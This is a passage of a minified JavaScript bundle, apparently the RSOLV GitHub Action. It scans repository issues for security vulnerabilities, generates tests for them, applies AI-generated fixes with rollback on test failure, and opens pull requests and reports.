fixed",data:Y}}catch(J){return q.error("[SCAN] Failed to analyze issue",J),{success:!1,phase:"scan",error:J instanceof Error?J.message:String(J)}}}async executeValidateForIssue(X,J){try{q.info(`[VALIDATE] Generating tests for issue #${X.number}`);let{analysisData:Q}=J;if(!Q.canBeFixed)return{success:!1,phase:"validate",message:"Issue cannot be fixed, skipping validation"};let Y;if(this.testGeneratingAnalyzer){let H=new Map;if(Q.filesToModify&&Q.filesToModify.length>0){let U=(await import("fs")).default,K=(await import("path")).default;for(let V of Q.filesToModify)try{let B=K.resolve(process.cwd(),V);if(U.existsSync(B)){let Z=U.readFileSync(B,"utf8");H.set(V,Z)}}catch(B){q.warn(`Could not read file ${V} for test generation:`,B)}}Y=await this.testGeneratingAnalyzer.analyzeWithTestGeneration(X,this.config,H)}else if(this.config.testGeneration?.enabled||this.config.fixValidation?.enabled!==!1){let H={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials},U=new YX(H),K=new Map;if(Q.filesToModify&&Q.filesToModify.length>0){let V=(await import("fs")).default,B=(await import("path")).default;for(let Z of Q.filesToModify)try{let M=B.resolve(process.cwd(),Z);if(V.existsSync(M)){let F=V.readFileSync(M,"utf8");K.set(Z,F)}}catch(M){q.warn(`Could not read file ${Z}:`,M)}}Y=await U.analyzeWithTestGeneration(X,this.config,K)}let W=`issue-${X.number}`,z={[W]:{validated:Y?.generatedTests?.success||!1,redTests:Y?.generatedTests||null,testResults:Y||null,falsePositiveReason:void 0,timestamp:new Date().toISOString(),hasSpecificVulnerabilities:!1,vulnerabilities:[],confidence:"low"}},G=this.getCurrentCommitSha();return await this.phaseDataClient.storePhaseResults("validate",{validation:z},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:G}),{success:!0,phase:"validate",message:z[W]?.validated?"Tests generated successfully":"Test generation skipped or failed",data:{validation:z}}}catch(Q){return q.error("[VALIDATE] Failed to generate tests",Q),{success:!1,phase:"validate",error:Q instanceof Error?Q.message:String(Q)}}}async executeMitigateForIssue(X,J,Q){let Y=Date.now(),W=this.getCurrentCommitSha();try{q.info(`[MITIGATE] Applying fix for issue #${X.number}`);let{analysisData:z}=J,{generatedTests:G}=Q,H={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.1,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials,claudeCodeConfig:{verboseLogging:!0,timeout:600000,executablePath:process.env.CLAUDE_CODE_PATH,useStructuredPhases:this.config.useStructuredPhases}},U;if(this.config.aiProvider.useVendedCredentials&&this.config.rsolvApiKey){process.env.RSOLV_API_KEY=this.config.rsolvApiKey,q.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:A}=await Promise.resolve().then(() => (dX(),W7));U=await A.getInstance(this.config.rsolvApiKey),q.info("Using vended credentials singleton for Claude Code")}let K,V=0,B=this.maxIterations||this.getMaxIterations(X),Z=X;while(V<B){q.info(`[MITIGATE] Fix attempt ${V+1}/${B}`);let A=new _7(H,process.cwd(),U),D={summary:`${z.issueType} issue analysis`,complexity:z.estimatedComplexity==="simple"?"low":z.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[z.suggestedApproach||""],recommendedApproach:z.suggestedApproach||"",relatedFiles:z.filesToModify},S=V>0?{current:V+1,max:B}:void 0;if(K=await A.generateSolutionWithGit(Z,D,void 0,Q,void 0,S),!K.success)return{success:!1,phase:"mitigate",message:K.message,error:K.error};q.info(`[MITIGATE DEBUG] DISABLE_FIX_VALIDATION env: ${process.env.DISABLE_FIX_VALIDATION}`),q.info(`[MITIGATE DEBUG] config.fixValidation?.enabled: ${this.config.fixValidation?.enabled}`),q.info(`[MITIGATE DEBUG] config.testGeneration?.validateFixes: ${this.config.testGeneration?.validateFixes}`);let $=this.config.fixValidation?.enabled===!1;if(q.info(`[MITIGATE DEBUG] skipValidation calculated as: ${$}`),$){q.info("[MITIGATE] \uD83D\uDCCB Skipping fix validation (DISABLE_FIX_VALIDATION=true)"),q.info("[MITIGATE] Fix will be applied without validation - proceeding to PR creation");break}else if((this.config.testGeneration?.validateFixes===!0||this.config.fixValidation?.enabled===!0)&&G?.success&&G.testSuite){q.info("[MITIGATE] Validating fix with tests...");let k=await(this.gitBasedValidator||new iX).validateFixWithTests(W,K.commitHash,G.testSuite);if(k.isValidFix){q.info("[MITIGATE]  Fix validated successfully");break}if(V++,V>=B)return m7(`git reset --hard ${W}`,{encoding:"utf-8"}),{success:!1,phase:"mitigate",message:`Fix validation failed after ${B} attempts`,error:this.explainTestFailureFromResult(k)};m7(`git reset --hard ${W}`,{encoding:"utf-8"}),Z=this.createEnhancedIssueWithTestFailure(X,k,Q,V,B);continue}break}q.info(`[MITIGATE] Creating PR from commit ${K.commitHash?.substring(0,8)}`);let F=process.env.RSOLV_EDUCATIONAL_PR!=="false"?await l2(X,K.commitHash,{...K.summary,vulnerabilityType:J.analysisData.vulnerabilityType||"security",severity:J.analysisData.severity||"medium",cwe:J.analysisData.cwe,isAiGenerated:J.analysisData.isAiGenerated},this.config,K.diffStats):await d2(X,K.commitHash,K.summary,this.config,K.diffStats);if(!F.success){try{m7("git reset --hard HEAD~1",{encoding:"utf-8"})}catch(A){q.warn("Failed to rollback commit",A)}return{success:!1,phase:"mitigate",message:F.message,error:F.error}}let j=Date.now()-Y;q.info(`[MITIGATE] Successfully created PR in ${j}ms`);let N={[`issue-${X.number}`]:{fixed:K.success||!1,prUrl:F.pullRequestUrl,fixCommit:K.commitHash,timestamp:new Date().toISOString()}};return await this.phaseDataClient.storePhaseResults("mitigate",{mitigation:N},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:K.commitHash}),{success:!0,phase:"mitigate",message:`Created PR #${F.pullRequestNumber}`,data:N}}catch(z){q.error("[MITIGATE] Failed to apply fix",z);try{m7(`git reset --hard ${W}`,{encoding:"utf-8"})}catch(G){q.warn("Failed to rollback after error",G)}return{success:!1,phase:"mitigate",error:z instanceof Error?z.message:String(z)}}}async executeThreePhaseForIssue(X){try{q.info(`[THREE-PHASE] Processing issue #${X.number} through all phases`);let J=await this.executeScanForIssue(X);if(!J.success)return{...J,phase:"three-phase"};if(!J.data?.canBeFixed)return{success:!1,phase:"three-phase",message:"Issue cannot be fixed automatically",data:{scan:J.data}};let Q=await this.executeValidateForIssue(X,J.data);if(!Q.success)return{...Q,phase:"three-phase",data:{scan:J.data,validation:Q.data}};let Y=await this.executeMitigateForIssue(X,J.data,Q.data);return{success:Y.success,phase:"three-phase",message:Y.success?`Successfully processed issue #${X.number} through all phases`:Y.message,data:{scan:J.data,validation:Q.data,mitigation:Y.data},error:Y.error}}catch(J){return q.error("[THREE-PHASE] Failed to process issue",J),{success:!1,phase:"three-phase",error:J instanceof Error?J.message:String(J)}}}checkGitStatus(){try{let X=m7("git status --porcelain",{encoding:"utf-8"}).trim();if(!X)return{clean:!0,modifiedFiles:[]};return{clean:!1,modifiedFiles:X.split(`
`).map((Q)=>Q.substring(3).trim()).filter((Q)=>Q.length>0)}}catch(X){return q.error("Failed to check git status",X),{clean:!1,modifiedFiles:["unknown"]}}}getMaxIterations(X){let J=X.labels.find((Q)=>Q.startsWith("fix-validation-max-"));if(J){let Q=parseInt(J.replace("fix-validation-max-",""));if(!isNaN(Q))return Q}if(this.config.fixValidation?.maxIterations!==void 0)return this.config.fixValidation.maxIterations;return 3}explainTestFailureFromResult(X){let J=[];if(!X.fixedCommit.redTestPassed)J.push("- The vulnerability still exists (RED test failed)");if(!X.fixedCommit.greenTestPassed)J.push("- The fix was not properly applied (GREEN test failed)");if(!X.fixedCommit.refactorTestPassed)J.push("- The fix broke existing functionality (REFACTOR test failed)");return J.join(`
`)}explainTestFailure(X){let J=[];if(!X.validated)J.push("- Validation failed");if(X.falsePositiveReason)J.push(`- False positive: ${X.falsePositiveReason}`);if(X.testResults&&!X.testResults.success)J.push("- Test execution failed");return J.length>0?J.join(`
`):"Unknown validation failure"}createEnhancedIssueWithTestFailure(X,J,Q,Y,W){let z=Q.generatedTests?.tests?.[0]?.testCode||"",G=Q.generatedTests?.tests?.[0]?.framework||"unknown";return{...X,body:`${X.body}

## Previous Fix Attempt Failed

The previous fix did not pass the generated security tests:

### Test Results:
- Red Test (vulnerability should be fixed): ${J.fixedCommit.redTestPassed?" PASSED":" FAILED"}
- Green Test (fix should work): ${J.fixedCommit.greenTestPassed?" PASSED":" FAILED"}
- Refactor Test (functionality maintained): ${J.fixedCommit.refactorTestPassed?" PASSED":" FAILED"}

### Generated Test Code:
\`\`\`${G}
${z}
\`\`\`

Please fix the vulnerability again, ensuring the fix passes all three tests.

### Why the Previous Fix Failed:
${this.explainTestFailure(J)}

This is attempt ${Y+1} of ${W}.`}}testGeneratingAnalyzer;gitBasedValidator;maxIterations;testRunner;testDiscovery;testIntegrator;githubClient;validationTimeout;async executeValidateStandalone(X){try{if(q.info(`[VALIDATE-STANDALONE] Processing ${X.issues?.length} issues`),!X.issues||X.issues.length===0)return{success:!1,phase:"validate",error:"No issues provided for validation"};let J=[];for(let W of X.issues)try{let z=null;if(X.usePriorScan)z=(await this.phaseDataClient.retrievePhaseResults(`${W.repository.owner}/${W.repository.name}`,W.number,this.getCurrentCommitSha()))?.scan;if(!z){let M=await X6(W,this.config);z={analysisData:{...M,canBeFixed:M?.canBeFixed||!1},canBeFixed:M?.canBeFixed||!1,usedPriorScan:!1}}if(!("canBeFixed"in z?z.canBeFixed:!0)){q.info(`[VALIDATE] Skipping issue #${W.number} - cannot be automatically fixed`),J.push({issueNumber:W.number,validated:!1,canBeFixed:!1,reason:"Issue cannot be automatically fixed",usedPriorScan:"usedPriorScan"in z?z.usedPriorScan:!1,timestamp:new Date().toISOString()});continue}let{ValidationMode:H}=await Promise.resolve().then(() => (H3(),z3)),U=new H(this.config,process.cwd());q.info(`[VALIDATE-STANDALONE] Using ValidationMode for issue #${W.number}`);let K=await U.validateVulnerability(W),V=null;if(X.runTests&&this.testRunner&&K.redTests)try{V=await this.testRunner.runTests(K.redTests),q.info(`Test execution result: ${V.redTestPassed?"PASSED":"FAILED"}`)}catch(M){q.warn(`Test execution failed for issue #${W.number}:`,M)}let B=null;if(this.testDiscovery){if(B=await this.testDiscovery.findExistingTests(W.repository),B.hasTests&&K.redTests){if(q.info(`Found existing test framework: ${B.framework}`),X.integrateTests&&this.testIntegrator)try{let M=await this.testIntegrator.integrateTests(K.redTests,B);q.info(`Test integration result: ${M.integrated}`)}catch(M){q.warn(`Test integration failed: ${M}`)}}}let Z={issueNumber:W.number,validated:K.validated,branchName:K.branchName,redTests:K.redTests,testResults:K.testResults,falsePositive:!K.validated,falsePositiveReason:K.falsePositiveReason,existingTests:B?.hasTests,testFramework:B?.framework,usedPriorScan:"usedPriorScan"in z?z.usedPriorScan:!1,timestamp:K.timestamp,commitHash:K.commitHash,hasSpecificVulnerabilities:K.validated,vulnerabilities:[],confidence:K.validated?"high":"low"};if(await this.phaseDataClient.storePhaseResults("validate",{validation:{[`issue-${W.number}`]:Z}},{repo:`${W.repository.owner}/${W.repository.name}`,issueNumber:W.number,commitSha:this.getCurrentCommitSha()}),X.postComment&&this.githubClient){let M=this.formatValidationComment(W,Z);await this.githubClient.createIssueComment(W.repository.owner,W.repository.name,W.number,M)}J.push(Z)}catch(z){q.error(`Failed to validate issue #${W.number}:`,z);let G=this.generateFallbackTests(W);J.push({issueNumber:W.number,testGenerationFailed:!0,fallbackTests:!0,generatedTests:G,error:z instanceof Error?z.message:String(z)})}let Q=null;if(X.format)Q=this.generateValidationReport(J,X.format);let Y=J.some((W)=>W.validated!==!1&&!W.testGenerationFailed&&W.canBeFixed!==!1);if(X.issues.length===1){let W=J[0];return{success:W.validated!==!1&&W.canBeFixed!==!1&&!W.testGenerationFailed,phase:"validate",message:W.canBeFixed===!1?"Issue cannot be automatically fixed":W.testGenerationFailed?"Test generation failed":`Validation completed for issue #${X.issues[0].number}`,data:{validation:W,report:Q},error:W.testGenerationFailed?W.error:void 0}}return{success:Y,phase:"validate",message:`Validated ${J.length} issues`,data:{validations:J,report:Q,annotations:X.format==="github-actions"?this.generateGitHubAnnotations(J):void 0}}}catch(J){return q.error("[VALIDATE-STANDALONE] Failed",J),{success:!1,phase:"validate",error:J instanceof Error?J.message:String(J)}}}async generateValidationTests(X,J){let{analysisData:Q}=J;if(this.testGeneratingAnalyzer||this.config.testGeneration?.enabled){let Y=this.testGeneratingAnalyzer||new YX({provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials}),W=await this.getCodebaseFiles(Q),G=(await Y.analyzeWithTestGeneration(X,this.config,W)).generatedTests;return{generatedTests:{success:G?.success??!0,...G,redTest:G?.tests?.[0]?.testCode||"should fail when vulnerability exists",greenTest:G?.tests?.[1]?.testCode||"should pass when vulnerability is fixed",refactorTest:G?.tests?.[2]?.testCode||"should maintain original functionality"},...J}}return{generatedTests:this.generateFallbackTests(X),...J}}async getCodebaseFiles(X){let J=new Map;if(X?.filesToModify&&X.filesToModify.length>0){let Q=(await import("fs")).default,Y=(await import("path")).default;for(let W of X.filesToModify)try{let z=Y.resolve(process.cwd(),W);if(Q.existsSync(z)){let G=Q.readFileSync(z,"utf8");J.set(W,G)}}catch(z){q.warn(`Could not read file ${W}:`,z)}}return J}generateFallbackTests(X){return{success:!1,redTest:`// RED Test: Should fail when ${X.title} exists`,greenTest:`// GREEN Test: Should pass when ${X.title} is fixed`,refactorTest:"// REFACTOR Test: Should maintain functionality after fix"}}formatValidationComment(X,J){return`## Validation Results

**Issue #${X.number}**: ${X.title}

### Test Generation
-  RED test generated (proves vulnerability exists)
-  GREEN test generated (validates fix)
-  REFACTOR test generated (ensures functionality preserved)

${J.falsePositive?`###  Possible False Positive
Tests pass on current code - vulnerability may not exist.`:""}

${J.testExecutionFailed?`###  Test Execution Failed
Tests were generated but could not be executed automatically.`:""}

### Next Steps
${J.falsePositive?`1. Review the generated tests
2. Close issue if false positive confirmed`:`1. Review the generated tests
2. Run mitigation mode to apply fix
3. Tests will validate the fix automatically`}
`}generateValidationReport(X,J){switch(J){case"markdown":return this.generateMarkdownReport(X);case"json":return JSON.stringify({issues:X},null,2);case"github-actions":return this.generateGitHubActionsReport(X);default:return JSON.stringify(X)}}generateMarkdownReport(X){let J=`# Validation Report

`;for(let Q of X)J+=`## Issue #${Q.issueNumber}

`,J+=Q.falsePositive?`**Status**:  Possible False Positive

`:`**Status**:  Validated

`,J+=`### Generated Tests
`,J+=`- RED test: Generated
`,J+=`- GREEN test: Generated
`,J+=`- REFACTOR test: Generated

`;return J}generateGitHubActionsReport(X){return X.map((J)=>`::${J.falsePositive?"warning":"notice"} ::Issue #${J.issueNumber} validated`).join(`
`)}generateGitHubAnnotations(X){return X.map((J)=>`::warning file=unknown,line=1::Issue #${J.issueNumber} - ${J.falsePositive?"Possible false positive":"Validation complete"}`)}async executeMitigateStandalone(X){try{if(q.info(`[MITIGATE-STANDALONE] Starting mitigation for ${X.issues?.length||1} issues`),!X.issues||X.issues.length===0)if(X.repository&&X.issueNumber){let H=await this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,await this.getCurrentCommitSha());if(!H?.validation&&!H?.validate)return{success:!1,phase:"mitigate",error:"No validation data available for mitigation"};let U={id:`issue-${X.issueNumber}`,number:X.issueNumber,title:"Issue from prior validation",body:"",labels:[],assignees:[],repository:{...X.repository,fullName:`${X.repository.owner}/${X.repository.name}`,defaultBranch:X.repository.defaultBranch||"main"},source:"github",createdAt:new Date().toISOString(),updatedAt:new Date().toISOString(),metadata:{}};X.issues=[U],X.validationData=H}else return{success:!1,phase:"mitigate",error:"No issues provided for mitigation"};let J=X.validationData;if(!J&&X.usePriorValidation){J={validation:{}};for(let H of X.issues){let U=await this.phaseDataClient.retrievePhaseResults(H.repository.fullName,H.number,await this.getCurrentCommitSha());if(U?.validation)Object.assign(J.validation,U.validation);else if(U?.validate)Object.assign(J.validation,U.validate)}}if(!J||Object.keys(J.validation||{}).length===0)if(X.generateTestsIfMissing){q.info("[MITIGATE-STANDALONE] No validation data, generating tests...");let H=await this.executeValidateStandalone(X);if(!H.success)return{success:!1,phase:"mitigate",error:"Failed to generate validation tests"};J=H.data}else return{success:!1,phase:"mitigate",error:"No validation data provided or found"};if(!this.config.aiProvider)return{success:!1,phase:"mitigate",error:"AI provider not configured"};let Q={},Y=!0,W=!1;for(let H of X.issues){let U=`issue-${H.number}`,K,V=J.validation||J.validate;if(V){if(V[U])K=V[U];else if(V.issueNumber===H.number)K=V}if(!K){q.warn(`[MITIGATE-STANDALONE] No validation data for issue #${H.number}`),Q[U]={success:!1,error:"No validation data for this issue"},Y=!1;continue}try{let B=this.mitigateIssue(H,K,X),Z=X.timeout||1800000,M=await Promise.race([B,new Promise((F,j)=>setTimeout(()=>j(new Error("Mitigation timeout")),Z))]);if(Q[U]=M,!M.success)Y=!1;else W=!0}catch(B){q.error(`[MITIGATE-STANDALONE] Failed to mitigate issue #${H.number}:`,B),Q[U]={success:!1,error:B instanceof Error?B.message:"Unknown error"},Y=!1}}let z,G;if(X.format==="markdown")z=this.generateMitigationMarkdownReport(Q);else if(X.format==="json")G={mitigations:Object.entries(Q).map(([H,U])=>({issue:H,...typeof U==="object"&&U!==null?U:{result:U}}))};return await this.phaseDataClient.storePhaseResults("mitigate",{mitigation:Q},{repo:X.issues[0].repository.fullName,commitSha:await this.getCurrentCommitSha()}),{success:Y,phase:"mitigate",message:!Y&&W?"Partial success":void 0,data:{mitigation:Q,testsGenerated:X.generateTestsIfMissing},report:z,jsonReport:G}}catch(J){return q.error("[MITIGATE-STANDALONE] Unexpected error:",J),{success:!1,phase:"mitigate",error:J instanceof Error?J.message:"Unknown error"}}}async mitigateIssue(X,J,Q){let{GitBasedClaudeCodeAdapter:Y}=await Promise.resolve().then(() => (u2(),_D)),W=new Y(this.config),z=0,G=Q.maxRetries||3,H;while(z<G){z++;try{let U=await W.generateSolutionWithGit(X,{summary:"Security issue fix",complexity:"medium",estimatedTime:30,potentialFixes:["Apply security fix"],recommendedApproach:"Fix security vulnerability"},void 0,J.generatedTests);if(Q.runTests){let{runTests:K}=await Promise.resolve().then(() => (ww(),Dw));if(!(await K(J.generatedTests?.tests||[])).passed){if(z<G){q.info(`[MITIGATE] Tests failed, retrying (attempt ${z}/${G})`);continue}throw new Error("Tests failed after fix")}}if(Q.refactorStyle)q.info("[MITIGATE] Refactoring code to match codebase style");if(Q.createPR){let K=await this.createMitigationPR(X,U,J,Q);return{success:!0,issueNumber:X.number,prUrl:K.url,prCreated:!0,prType:Q.prType||"standard",testsPass:!0,refactored:Q.refactorStyle||!1,attempts:z}}return{success:!0,issueNumber:X.number,fixCommit:U.commitHash,testsPass:!0,refactored:Q.refactorStyle||!1,attempts:z}}catch(U){if(H=U,U instanceof Error&&U.message.includes("Test environment"))throw U;if(z>=G)break}}return{success:!1,issueNumber:X.number,error:H?.message||"Failed to mitigate",attempts:z}}async createMitigationPR(X,J,Q,Y){let{createPullRequest:W}=await Promise.resolve().then(() => (Pw(),Cw)),z=`## Security Fix for Issue #${X.number}

`;if(z+=`### ${X.title}

`,Y.includeBeforeAfter)z+="### Before\n```javascript\n// Vulnerable code\n```\n\n",z+="### After\n```javascript\n// Fixed code\n```\n\n";if(Y.prType==="educational")z+=`### Security Education

`,z+=`This vulnerability is a ${Q.analysisData?.issueType||"security"} issue.

`,z+=`Learn more about this type of vulnerability and how to prevent it.

`,z+=`### Test Results
`,z+=` All security tests pass

`;return W({title:`Fix: ${X.title}`,body:z,head:`fix-${X.number}`,base:X.repository.defaultBranch})}generateMitigationMarkdownReport(X){let J=`## Mitigation Report

`;for(let[Q,Y]of Object.entries(X)){let W=Q.replace("issue-","");if(J+=`### Issue #${W}
`,Y.success){if(J+=` Fixed
`,Y.prUrl)J+=`- PR: ${Y.prUrl}
`;if(Y.testsPass)J+=`- Tests: Passing
`}else J+=` Failed: ${Y.error}
`;J+=`
`}return J}}async function Yc1(){try{q.info("Starting RSOLV action v2.0 - Enhanced Logging Active"),q.info(`Build timestamp: ${new Date().toISOString()}`);let X=await EU();q.info("Configuration loaded successfully");let J=IK();if(q.info(`Execution mode: ${J} - ${CK(J)}`),J==="scan"||J==="validate"||J==="mitigate"||J==="full"){let Q=new S3(X),Y=process.env.GITHUB_REPOSITORY;if(!Y)throw new Error("GITHUB_REPOSITORY environment variable not set");let[W,z]=Y.split("/"),G=await U5(W,z),H=await Q.execute(J,{repository:{owner:W,name:z,defaultBranch:G.defaultBranch||"main"},issueNumber:process.env.RSOLV_ISSUE_NUMBER?parseInt(process.env.RSOLV_ISSUE_NUMBER):void 0});if(process.env.GITHUB_OUTPUT){let U=await import("fs"),K=process.env.GITHUB_OUTPUT;if(H.data)U.appendFileSync(K,`phase_results=${JSON.stringify(H)}
`);if(J==="scan"&&H.data){let V=H.data;if(V.createdIssues)U.appendFileSync(K,`created_issues=${JSON.stringify(V.createdIssues)}
`),U.appendFileSync(K,`issues_created=${V.createdIssues.length}
`);if(V.vulnerabilities)U.appendFileSync(K,`scan_results=${JSON.stringify(V.vulnerabilities)}
`),U.appendFileSync(K,`security_findings=${JSON.stringify(V.vulnerabilities)}
`)}}return{success:H.success,message:H.message||`${J} phase completed`}}throw new Error(`Unsupported mode: ${J}. Supported modes: scan, validate, mitigate, full`)}catch(X){return q.error("Action failed",X),{success:!1,message:`RSOLV action failed: ${X instanceof Error?X.message:String(X)}`}}}Yc1().then((X)=>{if(X.success)process.exit(0);else process.exit(1)});
